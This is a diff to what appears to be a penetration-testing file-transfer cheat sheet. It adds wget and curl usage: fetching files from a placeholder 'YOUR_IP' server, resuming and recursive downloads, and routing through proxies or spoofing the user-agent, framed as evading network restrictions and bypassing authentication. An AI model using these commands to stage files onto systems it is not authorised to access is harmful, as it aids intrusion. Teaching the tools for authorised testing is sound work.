@@ -167,3 +167,72 @@ httpuploadexfil PORT_NUMBER DIRECTORY_FOR_UPLOADED_FILES
 ```bash
 python3 httpuploadexfil.py PORT_NUMBER DIRECTORY_FOR_UPLOADS
 ```
+## wget
+Short for “web-get” is a command-line tool used for non-interactive downloading of files from the web. It supports HTTP, HTTPS, and FTP and is designed to work reliably in unstable network conditions making it ideal for automated or background downloads.
+### Key Features
+- Supports downloading files over the internet using standard web protocols (HTTP, HTTPS, FTP)
+- Recursive downloading: Can mirror entire websites or directories
+- Resumes interrupted downloads: Useful in unreliable networks
+- Runs in the background: Ideal for automation and scripting
+- Supports proxy servers: Can evade network restrictions
+### Usage
+- To get a file from your hosted Python HTTP server
+```bash
+wget http://YOUR_IP:PORT/FILENAME
+```
+- To get a file from an Apache server
+```bash
+wget http://YOUR_IP/FILENAME
+```
+- Resume an interrupted download
+```bash
+wget -c http://YOUR_IP/FILENAME
+```
+- Recursive download
+```bash
+wget -r http://YOUR_IP/FOLDER_NAME
+```
+- Download in the background 
+```bash
+wget -b http://YOUR_IP/FILENAME
+```
+- Use a proxy server
+```bash
+wget -e use_proxy=yes -e http_proxy=PROXY_IP:PROXY_PORT http://YOUR_IP/FILENAME
+```
+### Note
+On Windows systems you must include -Outfile for the name of the downloaded file or -O followed by the name of the downloaded file
+## Curl
+Client URL or curl is a versatile command-line tool used for data transfers, supporting over 20+ network protocols including HTTP, HTTPS, FTP, SCP, SFTP, SMB, LDAP and more. Unlike wget, which is primarily for downloading files, curl is a full-featured tool for making requests, handling cookies, sending API data, and automating network interactions
+### Key Features
+- Supports multiple protocols: HTTP, HTTPS, FTP, SCP, SFTP, SMB, etc.
+- Works with APIs: Can send and receive JSON/XML data.
+- Handles authentication: Supports basic, digest, NTLM, and Bearer token authentication
+- Transfers files: Can upload and download files via HTTP, HTTPS, FTP, SCP, etc.
+- Manages cookies & sessions: Useful for bypassing authentication mechanisms.
+- Supports proxy & user-agent spoofing: Can help bypass network restrictions
+### Usage
+- Download a file from a Python HTTP server
+```bash
+curl -O http://YOUR_IP:PORT_NUMBER/FILENAME
+```
+- Download a file from Apache server
+```bash
+curl -O http://YOUR_IP/FILENAME
+```
+- Save the file with a different name
+```bash
+curl -o FILENAME http://YOUR_IP/FILENAME
+```
+- Resume a partial download
+```bash
+curl -C - -O http://YOUR_IP/FILENAME
+```
+- Spoof the user-agent to get past restrictions
+```bash
+curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://YOUR_IP/FILENAME
+```
+- Use a proxy server
+```bash
+curl -x socks5://PROXY_IP:PROXY_PORT -O http://YOUR_IP/FILENAME
+```
